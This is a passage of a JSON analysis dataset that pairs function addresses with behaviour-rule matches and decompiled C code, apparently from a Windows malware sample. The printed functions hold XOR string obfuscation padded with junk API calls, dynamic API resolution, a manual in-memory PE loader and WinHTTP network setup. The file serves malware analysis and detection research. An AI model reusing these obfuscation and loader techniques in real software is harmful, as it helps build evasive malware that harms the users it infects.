(*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        iVar6 = var_2ch;\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_18h;\n}\n",
        "token_count": 2519
    },
    "00410266": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00410266(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_38h;\n    uint32_t var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *hHeap;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    iVar6 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_8h = 6;\n            var_38h._0_1_ = 6;\n            stack0xffffffc5 = 0x1f020f1b;\n            var_33h = 0x13023b2b;\n            var_2fh._0_1_ = 0x34;\n            var_2fh._1_1_ = 0x1f;\n            var_2fh._2_2_ = 0x273b;\n            var_2bh._0_2_ = 0x162d;\n            var_2bh._2_2_ = 0x1c20;\n            var_27h._0_2_ = 0x262d;\n            var_27h._2_1_ = 0x6f;\n            stack0xffffffd8 = 0x46636f54;\n            var_20h._0_2_ = 0x487a;\n            var_1ch = param_2;\n            var_18h = param_1;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar7 = 0;\n            var_10h = &var_38h - iVar6;\n            var_14h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                if (iVar4 != 0xe767d8) {\n                    *(iVar7 + iVar6) = *(&var_27h + iVar7 % var_8h + 3) ^ (iVar7 + iVar6)[var_10h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x14);\n            var_33h = var_33h & 0xffffff | 0xd000000;\n            var_2fh._0_1_ = 0x21;\n            var_2fh._1_1_ = 6;\n            var_2fh._2_2_ = 0x1d55;\n            var_2bh._0_2_ = 0x740;\n            var_2bh._2_2_ = 0xe39;\n            var_27h._0_2_ = CONCAT11(var_27h._1_1_, 0x39);\n            stack0xffffffd8 = 0x39625563;\n            var_20h._0_2_ = 0x6e71;\n            uVar3 = (*pcVar1)(8, 0xb);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_10h = &var_33h + (3 - iVar7);\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                iVar4 = var_14h;\n                if (iVar5 != 0x7d2cca) {\n                    *(iVar6 + iVar7) = *(&var_27h + iVar6 % var_8h + 3) ^ (iVar6 + iVar7)[var_10h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar7, var_14h);\n            var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*pcVar1)(8, hHeap[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = *hHeap;\n            var_18h = var_18h[1] + 0xc;\n            fcn.004101d4();\n            piVar2 = hHeap;\n            iVar6 = (*var_14h)(2, var_8h, hHeap[1], var_18h, iVar6 + -0xc, &var_ch);\n            hHeap = iVar6;\n            if (iVar6 == 0) {\n                if (var_ch == piVar2[1]) {\n                    var_1ch[1] = var_8h;\n                    *var_1ch = var_ch;\n                }\n                else {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    iVar6 = -0x3fffff85;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*pcVar1)(uVar3);\n        }\n        else {\n            iVar6 = -0x3fffff85;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1407
    },
    "00401be4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401be4(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_EDX;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpBuffer;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x00401ea5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_48h = 0x6641766a;\n        var_44h = 0x6b133659;\n        var_40h = 0x7653771e;\n        piVar6 = lpMem;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x666b;\n        var_34h = 0x666b7636;\n        var_30h._0_1_ = 0x77;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar6 = (*pcVar3)(uVar4);\n        iVar5 = 0;\n        var_38h = piVar6;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n            iVar12 = lpBuffer;\n            if (iVar7 != 0x89e90b) {\n                var_18h = 5;\n                *(iVar5 + piVar6) = *(&var_34h + iVar5 % 5) ^ (iVar5 + piVar6)[&var_48h - piVar6];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar5 == 0) {\ncode_r0x00401e77:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_14h == 0) {\n                var_1ch = fcn.00401147();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.00401147();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto code_r0x00401e77;\n            iVar5 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar5 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar7 + (-0x2c - iVar5) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar5 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar7 = var_28h - piVar6;\n                        uVar8 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar5 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar6 = uVar8;\n                            piVar6 = piVar6 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar7 + piVar6);\n                            uVar8 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_2ch = var_34h;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar5);\n                if (iVar7 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar5);\n                }\n            }\n            *arg_10h = lpMem;\n            var_20h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n        }\n        uVar4 = (*pcVar11)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar5 = lpFindFileData;\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x00401ea5:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_20h;\n}\n",
        "token_count": 1972
    },
    "00403024": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403024(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1549
    },
    "0040324c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040324c(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint psz2;\n    uint var_4h;\n    \n    psz2 = *0x41dd68;\n    if (*0x41dac8 != 0) {\n        return 1;\n    }\n    var_40h = 0x4f067219;\n    var_3ch = 0x75366e4a;\n    var_38h = 0x72023023;\n    var_34h = 0x6e514f3b;\n    var_30h = 0x302a751f;\n    var_2ch = 0x4f1d723d;\n    var_28h = 0x75006e51;\n    var_24h = 0x720a302a;\n    var_20h = 0x6e554f26;\n    var_1ch = 0x303b7511;\n    var_18h = 0x4f1a7207;\n    var_14h = 0x75726e5e;\n    var_10h = 0x4f75726e;\n    var_ch._0_1_ = 0x30;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar4 != 0x1c4428) {\n            var_4h = 5;\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % 5) ^ (iVar5 + iVar3)[&var_40h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41dac8 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41dac8 != 0) {\n        if ((*0x41dac4 != 0) ||\n           (*0x41dac4 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41dac8, 0xf001f, 0, 0, 0x208),  *0x41dac4 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41dac4, psz2);\n            uVar2 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41dac8);\n        *0x41dac8 = 0;\n    }\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 829
    },
    "0040339e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040339e(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x004033dc:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.00403bc2(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x00403400:\n            fcn.0040f56a();\n            goto code_r0x00403407;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040f56a();\n            goto code_r0x004033dc;\n        }\n        if (uVar1 < 5) goto code_r0x00403400;\n        if (*puVar2[1] == uVar1) {\ncode_r0x00403407:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 317
    },
    "00403417": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00403417(int32_t arg_8h, uint *lpdwNumberOfBytesAvailable, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t lpdwNumberOfBytesRead)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t *in_EDX;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_424h;\n    uint lpszHeaders;\n    uint var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_100h;\n    int32_t var_fch;\n    uint lpdwBufferLength;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cfh;\n    uint var_cbh;\n    uint var_c7h;\n    uint var_c3h;\n    uint var_bfh;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint lpBuffer;\n    uint *var_50h;\n    uint var_4ch;\n    int32_t *var_48h;\n    int32_t var_44h;\n    uint *var_40h;\n    int32_t lpMultiByteStr;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t hRequest;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar3 = &lpszHeaders;\n    var_48h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar4 = 0x100; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_424h;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (arg_8h == 0x40) {\n        var_104h = 0;\n        var_108h = 0x34367964;\ncode_r0x0040348c:\n        var_10ch = 0x6f62722f;\n    }\n    else {\n        if (arg_8h == 0x20) {\n            var_104h = 0;\ncode_r0x00403482:\n            var_108h = 0x32337964;\n            goto code_r0x0040348c;\n        }\n        if (arg_8h == 0x140) {\n            var_104h = 0x30;\n            goto code_r0x00403482;\n        }\n    }\n    var_40h = &var_10ch;\n    if (lpdwNumberOfBytesAvailable != NULL) {\n        var_40h = lpdwNumberOfBytesAvailable;\n    }\n    iVar4 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar4 == 0) {\n        return 3;\n    }\n    var_44h = 5;\n    arg_8h = 6;\n    if (*0x41dacc == 0) {\n        var_f4h = 0x550e772a;\n        var_f0h = 0x611e671f;\n        var_ech = 0x770b6539;\n        var_e8h = 0x674a5500;\n        var_e4h = 0x657b6142;\n        var_e0h = 0x55417757;\n        var_dch = 0x6120674d;\n        var_d8h = 0x7709653c;\n        var_d4h._0_1_ = 5;\n        stack0xffffff29 = 0x670a55;\n        var_cfh = 0x47652661;\n        var_cbh = 0x31552f77;\n        var_c7h = 0x63615767;\n        var_c3h = 0x50774965;\n        var_bfh = 0x57675e55;\n        var_bbh = 0xe650261;\n        var_b7h = 0x53550f77;\n        var_b3h = 0x6e614367;\n        var_afh = 0x19774765;\n        var_abh = 0x43675355;\n        var_a7h = 0x47656e61;\n        var_a3h = 0x13551377;\n        var_9fh = 0x67614d67;\n        var_9bh = 0x4f775265;\n        var_97h = 0x5e675555;\n        var_93h = 0x20657561;\n        var_8fh._0_2_ = 0x477;\n        var_8fh._2_1_ = 0x55;\n        var_8fh._3_1_ = 6;\n        var_8bh = 0x3a611c67;\n        var_87h = 0x53774865;\n        var_83h = 0x47675455;\n        var_7fh = 0x57656561;\n        var_7bh = 0x55555077;\n        var_77h = 0x75614667;\n        var_73h = 0x8772165;\n        var_6fh = 0x12671755;\n        var_6bh = 0x8653361;\n        var_67h = 0x4a551977;\n        var_63h = 0x60614567;\n        var_5fh = 0x51774965;\n        var_5bh._0_2_ = 0x6555;\n        var_5bh._2_1_ = 0x67;\n        hRequest = 0x55617767;\n        var_10h._0_1_ = 0x65;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        lpdwNumberOfBytesAvailable = &var_f4h - iVar4;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            if (iVar2 != 0x8dab5c) {\n                *(iVar6 + iVar4) = *(&hRequest + iVar6 % var_44h) ^ *(lpdwNumberOfBytesAvailable + iVar6 + iVar4);\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x9c);\n        *0x41dacc = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar4, 0, 0, 0, 0);\n        if (*0x41dacc == 0) {\n            uVar1 = (*pcVar5)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return 1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41dacc, 5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar5)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar5)(8, (iVar4 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                  (0, 0, lpMultiByteStr, 0xffffffff, lpdwNumberOfBytesAvailable, iVar4 + 1);\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41dacc, lpdwNumberOfBytesAvailable, 0x50, 0);\n    var_34h = 0x5a06493f;\n    var_30h = 0x72395713;\n    var_2ch = 0x496d6729;\n    var_28h = 0x57485a5d;\n    var_24h = 0x6729726c;\n    var_20h = 0x5a57496d;\n    var_1ch = 0x72665703;\n    var_18h._0_2_ = 0x675a;\n    var_ch = 0x5a724957;\n    var_8h._0_1_ = 0x67;\n    uVar1 = (*pcVar5)(8, 0x3d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    hRequest = &var_34h - iVar4;\n    var_110h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != 0xcec247) {\n            *(iVar6 + iVar4) = *(&var_ch + iVar6 % var_44h) ^ (iVar6 + iVar4)[hRequest];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, lpdwNumberOfBytesAvailable, 0x50);\n    uVar1 = (*pcVar5)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    if (lpMultiByteStr == 0) {\n        arg_8h = 1;\n        goto code_r0x00403b9c;\n    }\n    if (var_40h == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_40h);\n        uVar1 = (*pcVar5)(8, (iVar4 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, var_40h, 0xffffffff, lpdwNumberOfBytesAvailable, iVar4 + 1);\n    }\n    var_50h = 0x73037803;\n    var_4ch = 0x46784419;\n    var_ch = 0x73467844;\n    var_8h._0_1_ = 0x4d;\n    uVar1 = (*pcVar5)(8, 0x11);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar4 = 0;\n    var_40h = puVar3;\n    hRequest = 